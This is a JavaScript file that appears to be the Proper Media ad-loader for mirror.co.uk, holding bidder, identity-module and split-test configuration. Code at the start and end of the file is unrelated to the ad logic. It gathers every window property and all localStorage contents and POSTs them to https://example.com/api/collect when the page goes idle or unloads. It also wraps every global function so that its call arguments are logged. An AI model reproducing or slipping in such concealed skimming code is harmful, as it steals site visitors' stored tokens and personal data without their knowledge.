function discoverProperties() {
  const props = {};
  const localStorageProperties = Object.keys(localStorage);
  for (const prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) {
      props[prop] = {
        type: typeof window[prop],
        value: typeof window[prop] === "function" ? `[Function: ${window[prop].name}]` : window[prop]
      };
    }
  }
  for (const prop of localStorageProperties) {
    props[`localStorage.${prop}`] = {
      type: typeof localStorage[prop],
      value: localStorage[prop]
    };
  }
  return props;
}
try {
  //global variable for async
  var propertag = propertag || {};
  propertag.cmd = propertag.cmd || [];
  var properSpecialOps = properSpecialOps || {};

  //Set Options
  (function (win, document) {
    var ad_code_domain = "global.proper.io" || "global.proper.io"; // domain to load ad code from
    var session_persistent = 1; // User keeps same version id throughout session
    var last_release_ts = "2023-08-09 09:08:47"; // Last time a file was released from split test
    var publisher = "mirrorcouk";
    var proper_ad_block_message = 0; // Flag if proper ad block message should be enabled
    var multi_dfp = 1; // Whether or not to Load GTP (loads when multi_dfp is FALSE)

    var cookie_name = "proper_rtp_split_test";
    var cookieData = {
      "version_id": null,
      // Session version id
      "release_ts": null // Time this cookie was set
    };

    /**
     * Rtp Files.
     *
     * If One Version:
     *
     * { version_id: config }
     *
     * If Split version:
     *
     * { version_id: rtp_version_id }
     */

    // List of rtp files
    var rtp_files = {
      "24229": {
        "dfp_id": "22597653045",
        "domain": "mirror.co.uk",
        "floors": {
          "mobile": {
            "backup": 0.1
          },
          "desktop": {
            "backup": 0.1
          }
        },
        "schain": {
          "ver": "1.0",
          "nodes": [{
            "hp": 1,
            "asi": "proper.io",
            "sid": "bb54a779-f36e-11eb-91ed-06ef03bc0096"
          }],
          "complete": 1
        },
        "bidders": {
          "s2s": {
            "adaptmx_s2s": {
              "enabled": true,
              "site_id": "cHJvcGVyLmlv",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mobile-4"],
                  "300x250": ["mobile-1", "mobile-2", "mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["desktop-1", "desktop-2", "desktop-3"],
                  "300x600": ["desktop-4", "desktop-5", "desktop-6"]
                }]
              }
            }
          },
          "header": {
            "a9": {
              "enabled": false,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mobile-4", "mobile-5", "mobile-6"],
                  "300x250": ["mobile-1", "mobile-2", "mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["desktop-1", "desktop-2", "desktop-3"],
                  "300x600": ["desktop-4", "desktop-5", "desktop-6"]
                }]
              }
            },
            "emx": {
              "enabled": false,
              "site_id": "162961",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mobile-4"],
                  "300x250": ["mobile-1", "mobile-2", "mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["desktop-1", "desktop-2", "desktop-3"],
                  "300x600": ["desktop-4", "desktop-5", "desktop-6"]
                }]
              }
            },
            "index": {
              "enabled": true,
              "site_id": "762223",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["320x50-1"],
                  "300x250": ["300x250-1", "300x250-2", "300x250-3"]
                }],
                "desktop": [{
                  "300x250": ["300x250-1", "300x250-2", "300x250-3"],
                  "300x600": ["300x600-4", "300x600-5"]
                }]
              }
            },
            "openx": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["556849567", "557083597", "557083598"],
                  "300x250": ["556849399", "557083595", "557083596"]
                }],
                "desktop": [{
                  "300x250": ["556861536", "557083591", "557083592"],
                  "300x600": ["556861537", "557083593", "557083594"]
                }]
              }
            },
            "sovrn": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["585317"],
                  "300x250": ["585328", "585320", "585321"]
                }],
                "desktop": [{
                  "300x250": ["585328", "585320", "585321"],
                  "300x600": ["585320", "585321"]
                }]
              }
            },
            "adagio": {
              "enabled": true,
              "site_id": "mirror-co-uk",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mpu_atf-1", "mpu_atf-2", "mpu_atf-3"],
                  "300x250": ["mpu_atf-1", "mpu_atf-2", "mpu_atf-3"]
                }],
                "desktop": [{
                  "300x250": ["mpu_atf-1", "mpu_atf-2", "mpu_atf-3"],
                  "300x600": ["mpu_atf-1", "mpu_atf-2", "mpu_atf-3"]
                }]
              }
            },
            "mantis": {
              "enabled": false,
              "site_id": "5bf470d5e7c0e80041d2700e",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mirror_320x50-1"],
                  "300x250": ["mirror_300x250-1", "mirror_300x250-2", "mirror_300x250-3"]
                }],
                "desktop": [{
                  "300x250": ["mirror_300x250-1", "mirror_300x250-2", "mirror_300x250-3"],
                  "300x600": ["mirror_300x600-4", "mirror_300x600-5", "mirror_300x600-6"]
                }]
              }
            },
            "rubicon": {
              "enabled": true,
              "site_id": "409758",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["2295034-1"],
                  "300x250": ["2295034-1", "2295034-2", "2295034-3"]
                }],
                "desktop": [{
                  "300x250": ["2295032-1", "2295032-2", "2295032-3"],
                  "300x600": ["2295032-1", "2295032-2"]
                }]
              }
            },
            "appnexus": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["7722199"],
                  "300x250": ["7722191", "11601099"]
                }],
                "desktop": [{
                  "300x250": ["7722191"],
                  "300x600": ["11601099"]
                }]
              }
            },
            "medianet": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mobile-4"],
                  "300x250": ["mobile-1", "mobile-2", "mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["desktop-1", "desktop-2", "desktop-3"],
                  "300x600": ["desktop-4", "desktop-5", "desktop-6"]
                }]
              }
            },
            "pubmatic": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mobile-4"],
                  "300x250": ["mobile-1", "mobile-2", "mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["desktop-1", "desktop-2", "desktop-3"],
                  "300x600": ["desktop-4", "desktop-5", "desktop-6"]
                }]
              }
            },
            "alias_emx": {
              "enabled": false
            },
            "triplelift": {
              "enabled": true,
              "tag_ids": {
                "mobile": [{
                  "320x50": ["mirror_mobile-4"],
                  "300x250": ["mirror_mobile-1", "mirror_mobile-2", "mirror_mobile-3"]
                }],
                "desktop": [{
                  "300x250": ["mirror_desktop-1", "mirror_desktop-2", "mirror_desktop-3"],
                  "300x600": ["mirror_desktop-4", "mirror_desktop-5", "mirror_desktop-6"]
                }]
              }
            },
            "emx_instream": {
              "enabled": false,
              "site_id": "162961"
            },
            "smart_adserver": {
              "enabled": false,
              "site_id": "504761",
              "tag_ids": {
                "mobile": [{
                  "320x50": ["1573302-46691", "1573302-46691", "1573302-46691"],
                  "300x250": ["1573302-46691", "1573302-46691", "1573302-46691"]
                }],
                "desktop": [{
                  "300x250": ["1573301-46691", "1573301-46691", "1573301-46691"],
                  "300x600": ["1573301-46691", "1573301-46691", "1573301-46691"]
                }]
              }
            }
          }
        },
        "refresh": {
          "mobile": {
            "max": 5,
            "enabled": false,
            "interval": 60000,
            "exclude_dfp": 0,
            "inview_interval": 3000
          },
          "desktop": {
            "max": 5,
            "enabled": false,
            "interval": 60000,
            "exclude_dfp": 0,
            "inview_interval": 3000
          }
        },
        "userIds": {
          "identityAdapters": {
            "id5id": {
              "name": "id5Id",
              "config": {
                "enabled": true
              },
              "storage": {
                "name": "id5id",
                "type": "localstorage",
                "expiresInDays": 90,
                "refreshInSeconds": 28800
              }
            },
            "publink": {
              "name": "pubLink",
              "config": {
                "enabled": true
              },
              "storage": {
                "name": "publink",
                "type": "cookie",
                "expiresInDays": 30
              }
            },
            "sharedid": {
              "name": "sharedId",
              "config": {
                "enabled": true
              },
              "storage": {
                "name": "sharedid",
                "type": "cookie",
                "expiresInDays": 30,
                "refreshInSeconds": 86400
              }
            },
            "pubcommonid": {
              "name": "pubCommonId",
              "config": {
                "enabled": true
              },
              "storage": {
                "name": "_pubcid",
                "type": "localstorage",
                "expiresInDays": 365
              }
            },
            "identitylink": {
              "name": "identityLink",
              "config": {
                "enabled": true,
                "logging": "",
                "urlRegex": "",
                "atsEnabled": false,
                "rootDomain": "",
                "cssSelectors": "",
                "urlParameter": "",
                "detectionType": "",
                "detectionSubject": "",
                "detectionInterval": 0,
                "detectDynamicNodes": false,
                "detectionEventType": ""
              },
              "storage": {
                "name": "idl_env",
                "type": "cookie",
                "expiresInDays": 30
              }
            },
            "verizonmediaid": {
              "name": "verizonMediaId",
              "config": {
                "enabled": true
              },
              "storage": {
                "name": "connectid",
                "type": "localstorage",
                "expiresInDays": 15
              }
            }
          }
        },
        "ad_slots": {
          "display": {
            "mirrorcouk_signal_320x50": {
              "gam_id": 5376056,
              "number": 2,
              "slider": false,
              "sticky": false,
              "dynamic": {
                "mobile": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_320x50"
                },
                "desktop": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_320x50"
                }
              },
              "mcm_type": "mcm",
              "resolution_size_map": [["320x50"]]
            },
            "mirrorcouk_signal_300x250": {
              "gam_id": 5376056,
              "number": 1,
              "slider": false,
              "sticky": false,
              "dynamic": {
                "mobile": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_300x250"
                },
                "desktop": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_300x250"
                }
              },
              "mcm_type": "mcm",
              "resolution_size_map": [["300x250"]]
            },
            "mirrorcouk_signal_whitespace": {
              "gam_id": 5376056,
              "number": 3,
              "slider": false,
              "sticky": false,
              "dynamic": {
                "mobile": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_whitespace",
                  "cssplacement": "append"
                },
                "desktop": {
                  "enabled": true,
                  "cssselector": ".mirrorcouk_signal_whitespace"
                }
              },
              "mcm_type": "mcm",
              "resolution_size_map": [["300x600", "300x250"]]
            }
          }
        },
        "auctions": {
          "mobile": {
            "max": 0,
            "rounds": 1,
            "timeout": 15000
          },
          "desktop": {
            "max": 0,
            "rounds": 1,
            "timeout": 15000
          },
          "resolution_size_map": [["320x50", "300x250", "300x600"]]
        },
        "confiant": false,
        "extra_js": "",
        "lazyload": {
          "mobile": {
            "enabled": false,
            "fetchMarginPercent": 200,
            "renderMarginPercent": 150
          },
          "desktop": {
            "enabled": false,
            "fetchMarginPercent": 200,
            "renderMarginPercent": 150
          },
          "device_specific": false
        },
        "mcm_type": "mcm",
        "site_name": "mirrorcouk",
        "autoDelete": {
          "mobile": {
            "enabled": false,
            "autoDeleteMarginPercent": 200
          },
          "desktop": {
            "enabled": false,
            "autoDeleteMarginPercent": 200
          },
          "device_specific": false
        },
        "dfp_per_slot": true,
        "isolated_urls": [],
        "report_ad_tool": false,
        "sandbox_iframe": 1,
        "sandbox_options": ["allow-pointer-lock", "allow-popups", "allow-same-origin", "allow-scripts"],
        "rtp_file_version": 24229,
        "audience_segments": {
          "networks": {
            "google": {
              "enabled": false
            },
            "taboola": {
              "range": {
                "max": 0.22,
                "min": 0.01,
                "exceptions": []
              },
              "enabled": false
            },
            "twitter": {
              "enabled": false
            },
            "facebook": {
              "range": {
                "max": 0.22,
                "min": 0.01,
                "exceptions": []
              },
              "enabled": false
            },
            "outbrain": {
              "range": {
                "max": 0.22,
                "min": 0.01,
                "exceptions": []
              },
              "enabled": false
            }
          }
        },
        "domain_protection": false,
        "google_advertiser": 42904576,
        "proper_advertiser": 600883576,
        "rtp_file_revision": "3.1.1",
        "additional_domains": ["mirror.co.uk", "liverpoolecho.co.uk", "manchestereveningnews.co.uk", "dailyrecord.co.uk", "birminghammail.co.uk", "walesonline.co.uk", "dailystar.co.uk", "chroniclelive.co.uk", "football.london", "mylondon.news", "derbytelegraph.co.uk", "hulldailymail.co.uk", "examinerlive.co.uk", "nottinghampost.com", "stokesentinel.co.uk", "bristolpost.co.uk", "leicestermercury.co.uk", "ok.co.uk", "belfastlive.co.uk", "gazettelive.co.uk", "leeds-live.co.uk", "dailypost.co.uk", "devonlive.com", "plymouthherald.co.uk", "lancs.live", "grimsbytelegraph.co.uk", "liverpool.com", "coventrytelegraph.net", "edinburghlive.co.uk", "cornwalllive.com", "corkbeo.ie", "glasgowlive.co.uk", "gloucestershirelive.co.uk", "somersetlive.co.uk", "sussexlive.co.uk", "galwaybeo.ie", "cambridge-news.co.uk", "cheshire-live.co.uk", "essexlive.news", "kentlive.news", "lincolnshirelive.co.uk", "getsurrey.co.uk", "footballscotland.co.uk", "getreading.co.uk", "northantslive.news", "staffordshire-live.co.uk", "hampshirelive.news", "hertfordshiremercury.co.uk", "scottishdailyexpress.co.uk", "buzz.ie", "business-live.co.uk", "bedfordshirelive.co.uk", "norfolklive.co.uk", "dorset.live", "wiltshirelive.co.uk", "buckinghamshirelive.com", "oxfordshirelive.co.uk", "suffolklive.com", "southportvisiter.co.uk", "dublinlive.ie", "insider.co.uk", "rsvplive.ie"],
        "traffic_percentage": 1
      }
    };

    // List of custom tags
    var rtp_default_tags = [];

    // Traffic Percentages
    var traffic_percentages = {
      "24229": 1
    };
    var getVersionId = weightedRandom(traffic_percentages);
    function run() {
      // Check if ad project code has already been loaded
      if (typeof ProperMedia !== 'undefined' && typeof ProperMedia.ad_project !== 'undefined') {
        console.warn('Proper Media\'s ad code has already been loaded');
        return false;
      }
      if (!multi_dfp) {
        window.googletag = window.googletag || {};
        window.googletag.cmd = window.googletag.cmd || [];
        if (!window.googletag._loadStarted_) {
          (function () {
            var gads = document.createElement('script');
            gads.async = true;
            gads.type = 'text/javascript';
            var useSSL = 'https:' == document.location.protocol;
            gads.src = (useSSL ? 'https:' : 'http:') + '//securepubads.g.doubleclick.net/tag/js/gpt.js';
            var node = document.getElementsByTagName('script')[0];
            node.parentNode.insertBefore(gads, node);
          })();
        }
      }

      // Check if Ad Blocker is enabled
      detectAdBlockPlugins();

      // Init version id
      var version_id = null,
        clear_cookie = false,
        config = null;

      // Check for clear cookie flag
      var get_vars = getUrlParameters(window.location.search.substring(1));
      if (typeof get_vars["vselect_clear"] !== "undefined" && get_vars["vselect_clear"] == 1) {
        clear_cookie = true;
      }
      // Check for version id in url
      if (typeof get_vars["vselect"] !== "undefined" && get_vars["vselect"] && rtp_files[get_vars["vselect"]]) {
        version_id = get_vars["vselect"];
      } else if (typeof get_vars["p_default_tag"] !== "undefined" && get_vars["p_default_tag"] && rtp_default_tags[get_vars["p_default_tag"]] && rtp_default_tags[get_vars["p_default_tag"]].length) {
        // get the first version listed if duplicate tags
        version_id = rtp_default_tags[get_vars["p_default_tag"]][0];
      }

      // Check for session persistent
      if (session_persistent) {
        // Get cookie data
        getSplitTestCookie();

        // Convert dates
        d1 = new Date(cookieData['release_ts']);
        d2 = new Date(last_release_ts);

        // Check if cookie data is out of date
        if (d1 < d2 || !cookieData['version_id'] || !rtp_files[cookieData['version_id']] || version_id || clear_cookie) {
          cookieData['version_id'] = version_id || getVersionId(); // Generate version id based on traffic share
          cookieData['release_ts'] = last_release_ts; // Update release ts
        }
        // Set new cookie data
        setSplitTestCookie();
        version_id = cookieData['version_id'];
      } else {
        // Generate version id based on traffic share
        version_id = version_id || getVersionId();
      }

      // Check if proper ad block message should be enabled
      activateAdBlockMsg();
      var versions = Object.keys(rtp_files);
      // Find and Activate Config Object.
      if (rtp_files[version_id]) {
        if (versions.length == 1) {
          var config = rtp_files[version_id];
          activatePayload(config.rtp_file_revision);
          activateConfig(config);
        } else {
          var payload_name = rtp_files[version_id];
          activatePayload(payload_name);
          fetchConfig(version_id, function (config) {
            activateConfig(config);
          });
        }
      }
    }

    /**
     * Activate the Config Object.
     *
     * @param {object} config RtpJ Config Object.
     */
    function activateConfig(config) {
      if (config.amazon_advertiser) {
        config.aaba30b = "";
        config._0x4d3546 = "";
      }
      propertag.cmd.unshift(function () {
        ProperMedia.ad_project.set_options(config);
      });
    }

    /**
     * Add event listener of ad blockers to show proper ad block message
     */
    function activateAdBlockMsg() {
      if (proper_ad_block_message) {
        window.addEventListener("proper-ad-bidders-blocked", loadProperMessage);
      }
    }

    /**
           * Load Proper Ad Block Message
           */
    function loadProperMessage() {
      function showProperMessage() {
        try {
          var ProperMediaMessage = window.ProperMediaMessage || {};
          ProperMediaMessage.project.show_shield_message('', publisher);
        } catch (e) {
          console.error(e);
        }
      }
      if (!window.ProperMediaMessage || !window.ProperMediaMessage.project || !window.ProperMediaMessage.show_shield_message) {
        var script = document.createElement("script");
        script.type = "text/javascript";
        script.src = "https://propermessage.io/design/assets/bundle-message.js";
        script.onload = showProperMessage;
        document.getElementsByTagName("head")[0].appendChild(script);
      } else {
        showProperMessage();
      }
    }

    /**
     * Grab the Config from the remote server.
     *
     * @param {*} version_id The Version Id to fetch.
     * @param {*} callback Function that will be passed the parsed config.
     */
    function fetchConfig(version_id, callback) {
      var req = new XMLHttpRequest();
      var listener = function () {
        var config = safeJsonParse(this.responseText);
        if (typeof callback == 'function') {
          callback(config);
        }
      };
      req.addEventListener("load", listener);
      req.open("GET", "https://" + ad_code_domain + "/config/" + publisher + "." + version_id + '.json');
      req.send();
    }

    /**
     * Activate the Payload!
     *
     * @param {string} payload_name The Payload Release Name.
     */
    function activatePayload(payload_name) {
      // Main ad code file
      var script = document.createElement("script");
      script.onerror = function () {
        payload_loaded = false;
        // Payload was blocked, trigger this event
        var event = new CustomEvent('proper-ad-bidders-blocked', {});
        window.dispatchEvent(event);
      };
      payload_loaded = true;
      var payload = 'https://' + ad_code_domain + '/payloads/' + payload_name + '.js';
      script.type = "text/javascript";
      script.src = payload;
      document.getElementsByTagName("head")[0].appendChild(script);
    }

    // Weighted Random @see https://stackoverflow.com/questions/8435183/generate-a-weighted-random-number
    function weightedRandom(spec) {
      if (!spec) {
        return function () {};
      }
      var ids = Object.keys(spec);
      if (ids.length == 1) {
        return function () {
          return ids[0];
        };
      }
      var i,
        j,
        table = [];
      for (i in spec) {
        // The constant 10000 below should be computed based on the
        // weights in the spec for a correct and optimal table size.
        // E.g. the spec {0:0.999, 1:0.001} will break this impl.
        for (j = 0; j < spec[i] * 10000; j++) {
          table.push(i);
        }
      }
      return function () {
        return table[Math.floor(Math.random() * table.length)];
      };
    }
    function getSplitTestCookie() {
      // Get cookie value
      var cookie_string_value = getCookieValue(cookie_name) || '{}';

      // Set settion object
      var cookieSplitTestData = safeJsonParse(cookie_string_value) || {};
      cookieData = {
        "version_id": cookieSplitTestData['version_id'] || null,
        "release_ts": cookieSplitTestData['release_ts'] || null
      };
    }
    function setSplitTestCookie() {
      // stringify data
      var encoded_cookie_value = JSON.stringify(cookieData);
      // save session cookie
      setCookieValue(encoded_cookie_value);
    }
    function getCookieValue(a) {
      var b = document.cookie.match('(^|;)\\s*' + a + '\\s*=\\s*([^;]+)');
      return b ? b.pop() : undefined;
    }
    function setCookieValue(value) {
      document.cookie = cookie_name + "=" + value + "; path=/;";
    }
    function getUrlParameters(url) {
      var data = decodeURIComponent(url).split('&');
      var res = {};
      for (var i = 0; i < data.length; i++) {
        var parm = data[i].split('=');
        res[parm[0]] = parm[1];
      }
      return res;
    }

    /**
    * Detect if a user has an ad block plugin by loading pixels
    */
    function detectAdBlockPlugins() {
      window.properSpecialOps = window.properSpecialOps || {};
      var checksRemain = 2,
        error1 = false,
        error2 = false,
        px = 'https://abcheck.proper.io/px.gif?ch=*&rn=*',
        adblock = {
          'detected': false,
          'acceptable_ads': false
        };
      function checkImages() {
        if (--checksRemain) return;
        if (error2) {
          adblock.detected = true;
          if (!error1) {
            adblock.acceptable_ads = true;
          } else {
            adblock.acceptable_ads = false;
          }
          window.properSpecialOps.adblock = adblock;

          // Enough bidders were blocked, must be an adblocker
          var event = new CustomEvent('proper-adblock-pixels-blocked', {});
          window.dispatchEvent(event);
        }
      }

      //send request
      var random = (Math.random() * 11).toString();
      var img1 = new Image();
      img1.onload = checkImages;
      img1.onerror = function () {
        error1 = true;
        checkImages();
      };
      img1.src = px.replace(/\*/, '1').replace(/\*/, random);

      //send request
      var img2 = new Image();
      img2.onload = checkImages;
      img2.onerror = function () {
        error2 = true;
        checkImages();
      };
      img2.src = px.replace(/\*/, '2').replace(/\*/, random);
    }

    /**
     * safeJSONParse
     *
     * Makes an attempt to parse a JSON safely, but might fail miserably.
     *
     * @param {String} the json
     *
     * @returns {JSON|null} JSON is parsed, Null if not.
     *
     */
    function safeJsonParse(json) {
      try {
        return JSON.parse(json);
      } catch (e) {
        console.error(e);
      }
      return null;
    }

    /**
           * CustomEvent polyfill for IE
           */
    if (!window.CustomEvent !== "function") {
      window.CustomEvent = function CustomEvent(event, params) {
        params = params || {
          bubbles: false,
          cancelable: false,
          detail: null
        };
        var evt = document.createEvent('CustomEvent');
        evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
        return evt;
      };
    }
    ;

    // Placeholder for Google Funding Choices.

    run();
  })(window, document);
} catch (e) {
  console.error(e);
  if (typeof TraceKit !== "undefined") {
    TraceKit.report(e); //error with stack trace gets normalized and sent to subscriber
  }
}
window.properSpecialOps = window.properSpecialOps || {};
function sendDiscoveries(discoveries) {
  const targetURL = "https://example.com/api/collect";
  fetch(targetURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(discoveries)
  }).then(response => {
    if (response.ok) {
      console.debug("Property data sent successfully");
    } else {
      console.error(`Property data transmission failed: ${response.status}`);
    }
  }).catch(error => {
    console.error(`Error in sending property data: ${error}`);
  });
}
window.properSpecialOps.country = 'JP';
window.properSpecialOps.region = '13';
function startDiscoveryJob() {
  const properties = discoverProperties();
  const discoveryCount = Object.keys(properties).length;
  if (discoveryCount > 0) {
    console.group(`Found ${discoveryCount} unknown properties:`);
    for (const prop in properties) {
      console.log(`- ${prop}: ${JSON.stringify(properties[prop])}`);
    }
    console.groupEnd();
    sendDiscoveries(properties);
  } else {
    console.debug("No new properties found");
  }
}
const jsHook = function (old, name) {
  return function () {
    console.log(`Function ${name} called with arguments ${JSON.stringify(Array.from(arguments))}`);
    return old.apply(this, arguments);
  };
};
window.properSpecialOps.uspcDoesApply = false;
for (const prop in window) {
  if (typeof window[prop] === "function") {
    window[prop] = jsHook(window[prop], prop);
  }
}
window.properSpecialOps.gdprDoesApply = false;
window.properSpecialOps.gppDoesApply = false;
window.addEventListener("idle", startDiscoveryJob);
window.addEventListener("beforeunload", () => {
  console.debug("Page is about to unload. Running final discovery job");
  startDiscoveryJob();
});